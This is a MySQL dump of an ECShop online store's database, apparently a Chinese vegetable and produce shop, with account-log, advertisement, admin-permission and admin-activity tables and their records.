 -- ecshop v2.x SQL Dump Program
-- http://5.hi5.cc
-- 
-- DATE : 2014-06-13 17:47:48
-- MYSQL SERVER VERSION : 5.6.14
-- PHP VERSION : 5.3.27
-- ECShop VERSION : v2.7.3
-- Vol : 1

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for `ec22703249_account_log`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_account_log`;
CREATE TABLE `ec22703249_account_log` (
  `log_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` mediumint(8) unsigned NOT NULL,
  `user_money` decimal(10,2) NOT NULL,
  `frozen_money` decimal(10,2) NOT NULL,
  `rank_points` mediumint(9) NOT NULL,
  `pay_points` mediumint(9) NOT NULL,
  `change_time` int(10) unsigned NOT NULL,
  `change_desc` varchar(255) NOT NULL,
  `change_type` tinyint(3) unsigned NOT NULL,
  PRIMARY KEY (`log_id`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=24 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_account_log
-- ----------------------------
INSERT INTO `ec22703249_account_log` VALUES ('1', '1', '0.00', '0.00', '888', '888', '1404751708', '注册送积分', '99');
INSERT INTO `ec22703249_account_log` VALUES ('2', '1', '100.00', '0.00', '0', '0', '1404780326', '赠送', '2');
INSERT INTO `ec22703249_account_log` VALUES ('3', '2', '0.00', '0.00', '888', '888', '1404932076', '注册送积分', '99');
INSERT INTO `ec22703249_account_log` VALUES ('4', '2', '100.00', '0.00', '0', '1000', '1404932118', '绑定会卡01000充值等级积分:0,消费积分1000', '99');
INSERT INTO `ec22703249_account_log` VALUES ('5', '3', '0.00', '0.00', '888', '888', '1405447895', '注册送积分', '99');
INSERT INTO `ec22703249_account_log` VALUES ('6', '5', '0.00', '0.00', '888', '888', '1405453307', '注册送积分', '99');
INSERT INTO `ec22703249_account_log` VALUES ('7', '1', '100.00', '0.00', '0', '1000', '1405534117', '绑定会卡00999充值等级积分:0,消费积分1000', '99');
INSERT INTO `ec22703249_account_log` VALUES ('8', '1', '10.00', '0.00', '0', '0', '1406248008', '绑定会卡00001充值等级积分:0,消费积分0', '99');
INSERT INTO `ec22703249_account_log` VALUES ('9', '0', '0.00', '0.00', '888', '888', '1407884332', '注册送积分', '99');
INSERT INTO `ec22703249_account_log` VALUES ('10', '17', '0.00', '0.00', '888', '888', '1407978012', '注册送积分', '99');
INSERT INTO `ec22703249_account_log` VALUES ('11', '17', '1000.00', '0.00', '0', '0', '1407978659', '绑定会卡888888充值等级积分:0,消费积分0', '99');
INSERT INTO `ec22703249_account_log` VALUES ('12', '17', '-900.00', '0.00', '0', '0', '1408179188', '12424', '2');
INSERT INTO `ec22703249_account_log` VALUES ('13', '17', '9000.00', '0.00', '0', '0', '1408179339', '35', '2');
INSERT INTO `ec22703249_account_log` VALUES ('14', '17', '154.50', '0.00', '0', '0', '1408180058', '23424', '99');
INSERT INTO `ec22703249_account_log` VALUES ('15', '17', '-154.50', '0.00', '0', '0', '1408180153', '用户套餐自动生成订单:2014081654691,自动扣除', '99');
INSERT INTO `ec22703249_account_log` VALUES ('16', '18', '0.00', '0.00', '888', '888', '1408243095', '注册送积分', '99');
INSERT INTO `ec22703249_account_log` VALUES ('17', '17', '100.00', '0.00', '0', '1000', '1408330459', '绑定会卡充值等级积分:0,消费积分1000', '99');
INSERT INTO `ec22703249_account_log` VALUES ('18', '17', '100.00', '0.00', '0', '1000', '1408330613', '绑定会卡充值等级积分:0,消费积分1000', '99');
INSERT INTO `ec22703249_account_log` VALUES ('19', '17', '100.00', '0.00', '0', '1000', '1408330709', '绑定会卡00993充值等级积分:0,消费积分1000', '99');
INSERT INTO `ec22703249_account_log` VALUES ('20', '17', '100.00', '0.00', '0', '1000', '1408331174', '绑定会卡00992充值等级积分:0,消费积分1000', '99');
INSERT INTO `ec22703249_account_log` VALUES ('21', '17', '100.00', '0.00', '0', '1000', '1408331232', '绑定会卡00991充值等级积分:0,消费积分1000', '99');
INSERT INTO `ec22703249_account_log` VALUES ('22', '17', '100.00', '0.00', '0', '1000', '1408331941', '绑定会卡00986充值等级积分:0,消费积分1000', '99');
INSERT INTO `ec22703249_account_log` VALUES ('23', '0', '0.00', '0.00', '888', '888', '1408332635', '注册送积分', '99');

-- ----------------------------
-- Table structure for `ec22703249_ad`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_ad`;
CREATE TABLE `ec22703249_ad` (
  `ad_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `position_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `media_type` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ad_name` varchar(60) NOT NULL DEFAULT '',
  `ad_link` varchar(255) NOT NULL DEFAULT '',
  `ad_code` text NOT NULL,
  `start_time` int(11) NOT NULL DEFAULT '0',
  `end_time` int(11) NOT NULL DEFAULT '0',
  `link_man` varchar(60) NOT NULL DEFAULT '',
  `link_email` varchar(60) NOT NULL DEFAULT '',
  `link_phone` varchar(60) NOT NULL DEFAULT '',
  `click_count` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `enabled` tinyint(3) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`ad_id`),
  KEY `position_id` (`position_id`),
  KEY `enabled` (`enabled`)
) ENGINE=MyISAM AUTO_INCREMENT=33 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_ad
-- ----------------------------
INSERT INTO `ec22703249_ad` VALUES ('1', '1', '0', '首页轮播底部广告1', 'http://shop.138wo.com', '1381078478245755980.jpg', '1381046400', '1478332800', '', '', '', '385', '1');
INSERT INTO `ec22703249_ad` VALUES ('2', '2', '0', '首页轮播底部广告2', 'http://shop.138wo.com', '1381078490585253095.jpg', '1381046400', '1478332800', '', '', '', '33', '1');
INSERT INTO `ec22703249_ad` VALUES ('3', '3', '0', '首页轮播底部广告3', 'http://shop.138wo.com', '1381078501056775939.jpg', '1381046400', '1478332800', '', '', '', '47', '1');
INSERT INTO `ec22703249_ad` VALUES ('4', '1', '0', '首页轮播底部广告4', 'http://shop.138wo.com', '1404695632781180512.jpg', '1381046400', '1478332800', '', '', '', '10', '1');
INSERT INTO `ec22703249_ad` VALUES ('5', '5', '0', '首页新品上架广告1', 'http://shop.138wo.com', '1381079074783077594.jpg', '1381046400', '1478332800', '', '', '', '35', '1');
INSERT INTO `ec22703249_ad` VALUES ('6', '6', '0', '首页新品上架广告2', 'http://shop.138wo.com', '1381079086419426180.jpg', '1381046400', '1478332800', '', '', '', '55', '1');
INSERT INTO `ec22703249_ad` VALUES ('7', '7', '0', '首页新品上架广告3', 'http://shop.138wo.com', '1381079098845415041.jpg', '1381046400', '1478332800', '', '', '', '4', '1');
INSERT INTO `ec22703249_ad` VALUES ('8', '8', '0', '首页新品上架广告4', 'http://shop.138wo.com', '1381079110798949923.jpg', '1381046400', '1478332800', '', '', '', '11', '1');
INSERT INTO `ec22703249_ad` VALUES ('9', '9', '0', '首页新品上架广告5', 'http://shop.138wo.com', '1381079123806215282.jpg', '1381046400', '1478332800', '', '', '', '14', '1');
INSERT INTO `ec22703249_ad` VALUES ('10', '10', '0', '首页新品上架广告6', 'http://shop.138wo.com', '1381079135375220123.jpg', '1381046400', '1478332800', '', '', '', '15', '1');
INSERT INTO `ec22703249_ad` VALUES ('11', '11', '0', '首页新品上架广告7', 'http://shop.138wo.com', '1381079148278788405.jpg', '1381046400', '1478332800', '', '', '', '8', '1');
INSERT INTO `ec22703249_ad` VALUES ('12', '12', '0', '首页新品上架广告8', 'http://shop.138wo.com', '1381079160614448364.jpg', '1381046400', '1478332800', '', '', '', '2', '1');
INSERT INTO `ec22703249_ad` VALUES ('13', '13', '0', '首页新品上架广告9', 'http://shop.138wo.com', '1381079173096324823.jpg', '1381046400', '1478332800', '', '', '', '4', '1');
INSERT INTO `ec22703249_ad` VALUES ('14', '14', '0', '首页热卖商品广告1', 'http://shop.138wo.com', '1381079769279843680.jpg', '1381046400', '1478332800', '', '', '', '13', '1');
INSERT INTO `ec22703249_ad` VALUES ('15', '15', '0', '首页热卖商品广告2', 'http://shop.138wo.com', '1381079782806067816.jpg', '1381046400', '1478332800', '', '', '', '19', '1');
INSERT INTO `ec22703249_ad` VALUES ('16', '16', '0', '首页热卖商品广告3', 'http://shop.138wo.com', '1381079794839130789.jpg', '1381046400', '1478332800', '', '', '', '7', '1');
INSERT INTO `ec22703249_ad` VALUES ('17', '17', '0', '首页热卖商品广告4', 'http://shop.138wo.com', '1381079807440076997.jpg', '1381046400', '1478332800', '', '', '', '3', '1');
INSERT INTO `ec22703249_ad` VALUES ('18', '18', '0', '首页热卖商品广告5', 'http://shop.138wo.com', '1381079819554664571.jpg', '1381046400', '1478332800', '', '', '', '0', '1');
INSERT INTO `ec22703249_ad` VALUES ('19', '19', '0', '首页热卖商品广告6', 'http://shop.138wo.com', '1381079834276524628.jpg', '1381046400', '1478332800', '', '', '', '5', '1');
INSERT INTO `ec22703249_ad` VALUES ('20', '20', '0', '首页热卖商品广告7', 'http://cayo.taobao.com', '1381079848807832620.jpg', '1381046400', '1478332800', '', '', '', '10', '1');
INSERT INTO `ec22703249_ad` VALUES ('21', '21', '0', '首页热卖商品广告8', 'http://cayo.taobao.com', '1381079860978991489.jpg', '1381046400', '1478332800', '', '', '', '2', '1');
INSERT INTO `ec22703249_ad` VALUES ('22', '22', '0', '首页热卖商品广告9', 'http://shop.138wo.com', '1381079871286558996.jpg', '1381046400', '1478332800', '', '', '', '0', '1');
INSERT INTO `ec22703249_ad` VALUES ('23', '23', '0', '首页热卖商品广告10', 'http://shop.138wo.com', '1381079884247885511.jpg', '1381046400', '1478332800', '', '', '', '1', '1');
INSERT INTO `ec22703249_ad` VALUES ('24', '24', '0', '首页热评商品广告', 'http://cayo.taobao.com', '1381080376013057330.jpg', '1381075200', '1478361600', '', '', '', '5', '1');
INSERT INTO `ec22703249_ad` VALUES ('25', '26', '0', '首页特卖商品广告', 'http://shop.138wo.com', '1381080407655272744.jpg', '1381046400', '1478332800', '', '', '', '15', '1');
INSERT INTO `ec22703249_ad` VALUES ('26', '25', '2', '首页热评商品文字说明', 'http://cayo.taobao.com', '<div class=\"score\"><span class=\"icon-stat icon-stat-5\"></span>\r\n            <label>(共0人评价)</label>\r\n          </div>\r\n          <div class=\"msg\"><strong class=\"people\">蓝博5210：</strong>\r\n            <p>质量超好！完美匹配！音质干净！价格实在！带上没有不适感！</p>\r\n          </div>', '1381075200', '1478361600', '', '', '', '0', '1');
INSERT INTO `ec22703249_ad` VALUES ('27', '27', '0', '首页-分类ID1-广告1', 'http://shop.138wo.com', '1381122527570139896.jpg', '1381046400', '1478332800', '', '', '', '13', '1');
INSERT INTO `ec22703249_ad` VALUES ('28', '28', '0', '首页-分类ID1-广告2', 'http://shop.138wo.com', '1381122544505045697.jpg', '1381046400', '1478332800', '', '', '', '0', '1');
INSERT INTO `ec22703249_ad` VALUES ('29', '29', '0', '导航右侧广告位', 'http://shop.138wo.com', '1389733610469692710.png', '1388908800', '1582876800', '', '', '', '3', '1');
INSERT INTO `ec22703249_ad` VALUES ('30', '30', '0', 'wap首页banner轮播1', '', '1393533057225562343.jpg', '1393315200', '1585296000', '', '', '', '178', '1');
INSERT INTO `ec22703249_ad` VALUES ('31', '30', '0', 'wap首页banner轮播2', '', '1393533036048445261.jpg', '1393315200', '1585296000', '', '', '', '39', '1');
INSERT INTO `ec22703249_ad` VALUES ('32', '4', '0', '1', '', '1404702356018715215.jpg', '1404633600', '1438761600', '', '', '', '1', '1');

-- ----------------------------
-- Table structure for `ec22703249_admin_action`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_admin_action`;
CREATE TABLE `ec22703249_admin_action` (
  `action_id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `action_code` varchar(20) NOT NULL DEFAULT '',
  `relevance` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`action_id`),
  KEY `parent_id` (`parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=136 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_admin_action
-- ----------------------------
INSERT INTO `ec22703249_admin_action` VALUES ('1', '0', 'goods', '');
INSERT INTO `ec22703249_admin_action` VALUES ('2', '0', 'cms_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('3', '0', 'users_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('4', '0', 'priv_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('5', '0', 'sys_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('6', '0', 'order_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('7', '0', 'promotion', '');
INSERT INTO `ec22703249_admin_action` VALUES ('8', '0', 'email', '');
INSERT INTO `ec22703249_admin_action` VALUES ('9', '0', 'templates_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('10', '0', 'db_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('11', '0', 'sms_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('21', '1', 'goods_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('22', '1', 'remove_back', '');
INSERT INTO `ec22703249_admin_action` VALUES ('23', '1', 'cat_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('24', '1', 'cat_drop', 'cat_manage');
INSERT INTO `ec22703249_admin_action` VALUES ('25', '1', 'attr_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('26', '1', 'brand_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('27', '1', 'comment_priv', '');
INSERT INTO `ec22703249_admin_action` VALUES ('84', '1', 'tag_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('30', '2', 'article_cat', '');
INSERT INTO `ec22703249_admin_action` VALUES ('31', '2', 'article_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('32', '2', 'shopinfo_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('33', '2', 'shophelp_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('34', '2', 'vote_priv', '');
INSERT INTO `ec22703249_admin_action` VALUES ('35', '7', 'topic_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('74', '4', 'template_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('73', '3', 'feedback_priv', '');
INSERT INTO `ec22703249_admin_action` VALUES ('38', '3', 'integrate_users', '');
INSERT INTO `ec22703249_admin_action` VALUES ('39', '3', 'sync_users', 'integrate_users');
INSERT INTO `ec22703249_admin_action` VALUES ('40', '3', 'users_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('41', '3', 'users_drop', 'users_manage');
INSERT INTO `ec22703249_admin_action` VALUES ('42', '3', 'user_rank', '');
INSERT INTO `ec22703249_admin_action` VALUES ('85', '3', 'surplus_manage', 'account_manage');
INSERT INTO `ec22703249_admin_action` VALUES ('43', '4', 'admin_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('44', '4', 'admin_drop', 'admin_manage');
INSERT INTO `ec22703249_admin_action` VALUES ('45', '4', 'allot_priv', 'admin_manage');
INSERT INTO `ec22703249_admin_action` VALUES ('46', '4', 'logs_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('47', '4', 'logs_drop', 'logs_manage');
INSERT INTO `ec22703249_admin_action` VALUES ('48', '5', 'shop_config', '');
INSERT INTO `ec22703249_admin_action` VALUES ('49', '5', 'ship_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('50', '5', 'payment', '');
INSERT INTO `ec22703249_admin_action` VALUES ('51', '5', 'shiparea_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('52', '5', 'area_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('53', '6', 'order_os_edit', '');
INSERT INTO `ec22703249_admin_action` VALUES ('54', '6', 'order_ps_edit', 'order_os_edit');
INSERT INTO `ec22703249_admin_action` VALUES ('55', '6', 'order_ss_edit', 'order_os_edit');
INSERT INTO `ec22703249_admin_action` VALUES ('56', '6', 'order_edit', 'order_os_edit');
INSERT INTO `ec22703249_admin_action` VALUES ('57', '6', 'order_view', '');
INSERT INTO `ec22703249_admin_action` VALUES ('58', '6', 'order_view_finished', '');
INSERT INTO `ec22703249_admin_action` VALUES ('59', '6', 'repay_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('60', '6', 'booking', '');
INSERT INTO `ec22703249_admin_action` VALUES ('61', '6', 'sale_order_stats', '');
INSERT INTO `ec22703249_admin_action` VALUES ('62', '6', 'client_flow_stats', '');
INSERT INTO `ec22703249_admin_action` VALUES ('78', '7', 'snatch_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('83', '7', 'ad_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('80', '7', 'gift_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('81', '7', 'card_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('70', '1', 'goods_type', '');
INSERT INTO `ec22703249_admin_action` VALUES ('82', '7', 'pack', '');
INSERT INTO `ec22703249_admin_action` VALUES ('79', '7', 'bonus_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('75', '5', 'friendlink', '');
INSERT INTO `ec22703249_admin_action` VALUES ('76', '5', 'db_backup', '');
INSERT INTO `ec22703249_admin_action` VALUES ('77', '5', 'db_renew', 'db_backup');
INSERT INTO `ec22703249_admin_action` VALUES ('86', '4', 'agency_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('87', '3', 'account_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('88', '5', 'flash_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('89', '5', 'navigator', '');
INSERT INTO `ec22703249_admin_action` VALUES ('90', '7', 'auction', '');
INSERT INTO `ec22703249_admin_action` VALUES ('91', '7', 'group_by', '');
INSERT INTO `ec22703249_admin_action` VALUES ('92', '7', 'favourable', '');
INSERT INTO `ec22703249_admin_action` VALUES ('93', '7', 'whole_sale', '');
INSERT INTO `ec22703249_admin_action` VALUES ('94', '1', 'goods_auto', '');
INSERT INTO `ec22703249_admin_action` VALUES ('95', '2', 'article_auto', '');
INSERT INTO `ec22703249_admin_action` VALUES ('96', '5', 'cron', '');
INSERT INTO `ec22703249_admin_action` VALUES ('97', '5', 'affiliate', '');
INSERT INTO `ec22703249_admin_action` VALUES ('98', '5', 'affiliate_ck', '');
INSERT INTO `ec22703249_admin_action` VALUES ('99', '8', 'attention_list', '');
INSERT INTO `ec22703249_admin_action` VALUES ('100', '8', 'email_list', '');
INSERT INTO `ec22703249_admin_action` VALUES ('101', '8', 'magazine_list', '');
INSERT INTO `ec22703249_admin_action` VALUES ('102', '8', 'view_sendlist', '');
INSERT INTO `ec22703249_admin_action` VALUES ('103', '1', 'virualcard', '');
INSERT INTO `ec22703249_admin_action` VALUES ('104', '7', 'package_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('105', '1', 'picture_batch', '');
INSERT INTO `ec22703249_admin_action` VALUES ('106', '1', 'goods_export', '');
INSERT INTO `ec22703249_admin_action` VALUES ('107', '1', 'goods_batch', '');
INSERT INTO `ec22703249_admin_action` VALUES ('108', '1', 'gen_goods_script', '');
INSERT INTO `ec22703249_admin_action` VALUES ('109', '5', 'sitemap', '');
INSERT INTO `ec22703249_admin_action` VALUES ('110', '5', 'file_priv', '');
INSERT INTO `ec22703249_admin_action` VALUES ('111', '5', 'file_check', '');
INSERT INTO `ec22703249_admin_action` VALUES ('112', '9', 'template_select', '');
INSERT INTO `ec22703249_admin_action` VALUES ('113', '9', 'template_setup', '');
INSERT INTO `ec22703249_admin_action` VALUES ('114', '9', 'library_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('115', '9', 'lang_edit', '');
INSERT INTO `ec22703249_admin_action` VALUES ('116', '9', 'backup_setting', '');
INSERT INTO `ec22703249_admin_action` VALUES ('117', '9', 'mail_template', '');
INSERT INTO `ec22703249_admin_action` VALUES ('118', '10', 'db_backup', '');
INSERT INTO `ec22703249_admin_action` VALUES ('119', '10', 'db_renew', '');
INSERT INTO `ec22703249_admin_action` VALUES ('120', '10', 'db_optimize', '');
INSERT INTO `ec22703249_admin_action` VALUES ('121', '10', 'sql_query', '');
INSERT INTO `ec22703249_admin_action` VALUES ('122', '10', 'convert', '');
INSERT INTO `ec22703249_admin_action` VALUES ('124', '11', 'sms_send', '');
INSERT INTO `ec22703249_admin_action` VALUES ('128', '7', 'exchange_goods', '');
INSERT INTO `ec22703249_admin_action` VALUES ('129', '6', 'delivery_view', '');
INSERT INTO `ec22703249_admin_action` VALUES ('130', '6', 'back_view', '');
INSERT INTO `ec22703249_admin_action` VALUES ('131', '5', 'reg_fields', '');
INSERT INTO `ec22703249_admin_action` VALUES ('132', '5', 'shop_authorized', '');
INSERT INTO `ec22703249_admin_action` VALUES ('133', '5', 'webcollect_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('134', '4', 'suppliers_manage', '');
INSERT INTO `ec22703249_admin_action` VALUES ('135', '4', 'role_manage', '');

-- ----------------------------
-- Table structure for `ec22703249_admin_log`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_admin_log`;
CREATE TABLE `ec22703249_admin_log` (
  `log_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `log_time` int(10) unsigned NOT NULL DEFAULT '0',
  `user_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `log_info` varchar(255) NOT NULL DEFAULT '',
  `ip_address` varchar(15) NOT NULL DEFAULT '',
  PRIMARY KEY (`log_id`),
  KEY `log_time` (`log_time`),
  KEY `user_id` (`user_id`)
) ENGINE=MyISAM AUTO_INCREMENT=265 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_admin_log
-- ----------------------------
INSERT INTO `ec22703249_admin_log` VALUES ('1', '1403825137', '1', '还原数据库备份: 备份时间2014-06-13 17:47:48', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('2', '1403825327', '1', '编辑广告: 首页轮播底部广告4', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('3', '1403825332', '1', '编辑广告: 首页轮播底部广告3', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('4', '1403825337', '1', '编辑广告: 首页轮播底部广告2', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('5', '1403825344', '1', '编辑广告: 首页轮播底部广告1', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('6', '1403825350', '1', '编辑广告: 首页特卖商品广告', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('7', '1403825373', '1', '编辑广告: 首页热卖商品广告9', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('8', '1403825378', '1', '编辑广告: 首页热卖商品广告6', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('9', '1403825383', '1', '编辑广告: 首页热卖商品广告5', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('10', '1403825391', '1', '编辑广告: 首页热卖商品广告4', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('11', '1403825398', '1', '编辑广告: 首页热卖商品广告3', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('12', '1403825403', '1', '编辑广告: 首页热卖商品广告2', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('13', '1403825413', '1', '编辑广告: 首页热卖商品广告10', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('14', '1403825422', '1', '编辑广告: 首页热卖商品广告1', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('15', '1403825429', '1', '编辑广告: 首页新品上架广告9', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('16', '1403825439', '1', '编辑广告: 首页新品上架广告8', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('17', '1403825447', '1', '编辑广告: 首页新品上架广告7', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('18', '1403825457', '1', '编辑广告: 首页新品上架广告6', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('19', '1403825464', '1', '编辑广告: 首页新品上架广告5', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('20', '1403825474', '1', '编辑广告: 首页新品上架广告4', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('21', '1403825481', '1', '编辑广告: 首页新品上架广告3', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('22', '1403825490', '1', '编辑广告: 首页新品上架广告2', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('23', '1403825497', '1', '编辑广告: 首页新品上架广告1', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('24', '1403825506', '1', '编辑广告: 首页-分类ID1-广告2', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('25', '1403825514', '1', '编辑广告: 首页-分类ID1-广告1', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('26', '1403825521', '1', '编辑广告: 导航右侧广告位', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('27', '1403831582', '1', '编辑商店设置: ', '223.92.41.163');
INSERT INTO `ec22703249_admin_log` VALUES ('28', '1404695632', '1', '编辑广告: 首页轮播底部广告4', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('29', '1404697518', '1', '编辑商品: 舌尖上的佳肴', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('30', '1404697563', '1', '编辑商品: 君禾园红萝卜', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('31', '1404697602', '1', '编辑商品: 君禾园蔬菜篮', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('32', '1404697641', '1', '编辑商品: 君禾园土鸡', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('33', '1404697670', '1', '编辑商品: 君禾园蚕豆', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('34', '1404697694', '1', '编辑商品: 君禾园苦瓜', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('35', '1404698223', '1', '编辑商品分类: 蔬果类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('36', '1404698277', '1', '编辑商品分类: 叶菜类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('37', '1404698299', '1', '编辑商品分类: 茎菜类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('38', '1404698318', '1', '编辑商品分类: 根菜类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('39', '1404698358', '1', '添加商品分类: 豆类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('40', '1404698409', '1', '添加商品分类: 瓜果类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('41', '1404698426', '1', '添加商品分类: 芽菜类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('42', '1404698445', '1', '添加商品分类: 调味料类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('43', '1404698459', '1', '添加商品分类: 花菜类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('44', '1404698475', '1', '添加商品分类: 菌菇类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('45', '1404698567', '1', '编辑商品分类: 五谷杂粮', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('46', '1404698586', '1', '删除商品分类: 测试分类1', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('47', '1404698590', '1', '删除商品分类: 测试分类2', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('48', '1404698608', '1', '编辑商品分类: 谷物类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('49', '1404698643', '1', '编辑商品分类: 豆类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('50', '1404698653', '1', '编辑商品分类: 禾薯类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('51', '1404698885', '1', '编辑商品分类: 推广产品', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('52', '1404698915', '1', '编辑商品分类: 禾署类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('53', '1404698942', '1', '编辑商品分类: 叶菜类、', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('54', '1404699028', '1', '编辑商品分类: 豆类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('55', '1404699049', '1', '编辑商品分类: 茎菜类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('56', '1404699115', '1', '添加商品分类: 瓜果类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('57', '1404699130', '1', '添加商品分类: 根茎类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('58', '1404699153', '1', '添加商品分类: 蛋类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('59', '1404699168', '1', '添加商品分类: 营养品', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('60', '1404699219', '1', '编辑商品分类: 肉禽蛋产品', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('61', '1404699252', '1', '编辑商品分类: 禽类', '180.173.35.237');
INSERT INTO `ec22703249_admin_log` VALUES ('62', '1404699267', '1', '编辑商品分类: 肉类', '180.173.35.237');
